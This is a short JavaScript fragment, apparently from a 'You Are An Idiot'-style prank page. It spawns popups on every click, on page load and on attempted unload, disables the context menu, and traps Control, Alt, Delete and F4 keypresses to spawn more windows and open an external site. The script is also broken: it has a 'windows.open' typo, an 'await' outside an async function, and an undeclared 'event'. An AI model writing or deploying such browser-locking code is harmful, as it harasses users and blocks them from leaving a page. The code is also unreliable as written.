/*
 * [Aug 2023] Fixed the popup mechanism, made it more robust.
 *
 * Requires safe.js & math.js preload.
 */
document.addEventListener("click", async () => {
	await proCreate(3);
});

window.onload = playBall;
window.oncontextmenu = () => false;
window.onkeydown = async () => {
	if (['Control', 'Alt', 'Delete', 'F4'].includes(event.key)) {
		await proCreate(3);

		windows.open("https://devbarhub.github.io/YouAreAnIdiot", "_blank");
	}

	return null;
}
window.onbeforeunload = () => await proCreate(3);
/* [Aug 2023] End of amendments. */
